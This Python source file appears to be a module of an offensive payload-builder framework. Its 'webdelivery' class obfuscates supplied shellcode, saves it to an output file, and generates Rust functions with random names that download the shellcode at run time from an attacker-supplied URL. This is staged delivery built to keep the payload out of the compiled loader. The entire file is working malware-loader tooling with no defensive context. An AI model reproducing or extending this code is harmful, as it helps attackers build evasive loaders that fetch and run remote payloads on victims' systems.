import random
import string
import json
from utils.utils import *

class webdelivery:

    def __init__(self, shellcode, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.shellcodeType = type(shellcode).__name__
        if self.shellcodeType == "str":
            self.type = 'String'
            open(outfile, 'w').write(shellcode)
        elif self.shellcodeType == "bytes":
            self.type = f"[u8; {len(shellcode)}]"
            open(outfile, 'wb').write(shellcode)
        elif self.shellcodeType == "list":
            self.type = f"[&'static str; {len(shellcode)}]"
            open(outfile, 'w').write('\n'.join(shellcode))
        self.shellcode = globals()[f'{type(shellcode).__name__}_to_rs'](shellcode, 'obfuscated')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)

    def compilerOptions(self):
        return ['reqwest = {version = "0.13.4", features = ["blocking"]}']

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}()')

    def imports(self):
        return ['extern crate reqwest;']

    def codeblock(self):

        if self.shellcodeType == 'bytes':
            return f"""
fn {self.name}() -> {self.type}{{
    let response = reqwest::blocking::get("{self.url}");
    response.unwrap().bytes().unwrap().as_ref().try_into().unwrap()
}}
"""
        elif self.shellcodeType == 'str':
            return f"""
fn {self.name}() -> {self.type} {{
    let response = reqwest::blocking::get("{self.url}");
    response.unwrap().text().unwrap()
}}
"""
        elif self.shellcodeType == 'list':

            return f"""
fn {self.name}() -> Vec<String> {{
    let response = reqwest::blocking::get("{self.url}");
    let responsetext = response.unwrap().text().unwrap();
    responsetext.split('\\n').map(String::from).collect()
}}
"""